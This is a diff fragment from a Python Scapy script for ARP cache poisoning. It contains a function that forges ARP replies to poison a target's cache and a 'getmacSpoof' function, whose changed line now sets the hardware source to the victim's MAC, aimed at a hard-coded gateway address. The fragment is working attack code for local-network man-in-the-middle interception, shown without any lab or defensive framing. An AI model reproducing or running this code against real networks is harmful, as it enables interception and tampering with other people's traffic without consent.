@@ -10,7 +10,7 @@ def getmac(targetip):
   targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
   return targetmac
 def getmacSpoof(victimIP,victimMAC):
-  arppacket= Ether(src=victimMAC,dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst='10.12.21.1',psrc=victimIP)  
+  arppacket= Ether(src=victimMAC,dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst='10.12.21.1',psrc=victimIP,hwsrc=victimMAC)  
   sendp(arppacket, verbose= False)
 def spoofarpcache(targetip, targetmac, sourceip, sourcemac):
   spoofed=  Ether(src=sourcemac)/ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac , hwsrc=sourcemac)
